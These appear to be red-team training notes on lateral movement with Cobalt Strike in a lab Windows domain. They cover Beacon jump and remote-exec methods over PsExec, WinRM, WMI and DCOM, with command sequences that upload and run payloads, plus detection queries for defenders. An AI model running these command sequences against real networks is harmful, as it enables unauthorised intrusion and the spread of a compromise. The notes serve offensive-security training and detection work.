# Lateral Movement

Moving between hosts in a domain helps access sensitive information and obtain new credentials. Using Aggressor, custom methods can be used for **jump** and **remote-exec**. Each of these strategies are compatible with User Impersonation techniques (e.g. use pth to impersonate a user and then jump to move laterally). Some of Seatbelt's commands can also be run remotely (e.g. ```execute-assembly Seatbelt.exe OSInfo -ComputerName=web```).

### jump

```jump [method] [target] [listener]``` spawns a beacon payload on the remote target (and connect to it if using a P2P listener).

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec/psexec64         x86/x64 Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm/winrm64           x86/x64 Run a PowerShell script via WinRM

### remote-exec

```remote-exec [method] [target] [command]``` executes the command on the target (not exclusive to lateral movement). Needs more manual work to manage the payload, but does offer a wider degree of control. 

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI

## Windows Remote Management

The **winrm / winrm64** methods return a high priv beacon running as the user interacting with the remote machine. SMB Beacon traffic blends in very well with expected traffic on Windows networks.

```jump winrm64 web.dev.cyberbotic.io smb``` - creates a Beacon that runs inside wsmprovhost.exe (the Host process for WinRM plug-ins), used whenever WinRM is used, legitimate or not. 

Admins can search for process start events, but get a lot of false positives. Best way to catch is to search PS script block logs for known payload artefacts, e.g. ```event.category: process and powershell.file.script_block_text: "$var_runme.Invoke([IntPtr]::Zero)"```

## PsExec

**psexec / psexec64** upload a service binary to the target, then create and starting a service to execute that binary. Beacons run as SYSTEM. 

```jump psexec64 web.dev.cyberbotic.io smb``` 

Catch by looking for 4697 service created events (which are rare, unless a service comes with other software). CS uses a random 7-char alphanumeric string for service name and binary filename. When setting the binPath for the service, it uses a UNC path to the ADMIN$ share: ```event.code: 4697 and winlog.event_data.ServiceFileName: \\\\*\\ADMIN$\\*.exe```

**psexec_psh** doesn't copy a binary to the target, but runs a PS 32-bit command. The pattern it uses by default is ```%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand ....```

```jump psexec_psh web smb```

## Windows Management Instrumentation (WMI)

WMI is part of remote-exec, which uses WMI's "process call create" to run a command on the target. Easiest way is to upload a payload to the target and run it via WMI. The process runs in an elevated context of the calling user.

    beacon> cd \\web.dev.cyberbotic.io\ADMIN$
    beacon> upload C:\Payloads\smb_x64.exe
    beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
    beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10  // connect to process

To catch, look for process create events where WmiPrvSE is the parent: ```event.category: process and event.type: start and process.parent.name: WmiPrvSE.exe```

# CoInitializeSecurity oddity

Beacon's implementation of WMI uses a [Beacon Object File](https://cobaltstrike.com/help-beacon-object-files), executed using the [beacon_inline_execute](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_inline_execute) function -- which can call the [CoInitializeSecurity](https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity) COM object, which sets the security context for the current process (and can only be called once per process). So future BOFs may not be able to inherit a different security context ("User B") for the lifetime of the Beacon process; WMI will then fail with access denied.

A workaround is to execute WMI from a different process. Use commands such as spawn and spawnas, or even execute-assembly with a tool such as SharpWMI: ```execute-assembly SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command="C:\Windows\smb_x64.exe"```

## Distributed Component Object Model

Beacon can't interact over DCOM, so use a tool like [Invoke-DCOM](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), which can be integrated into the jump command.

    beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
    beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
    beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
    
DCOM is hard to detect since each "Method" works differently. For MMC20.Application, the spawned process will be a child of mmc.exe: ```event.category: process and event.type : start and process.parent.name: mmc.exe```. Processes started may also have the parent svchost.exe and command line arguments of -k DcomLaunch.
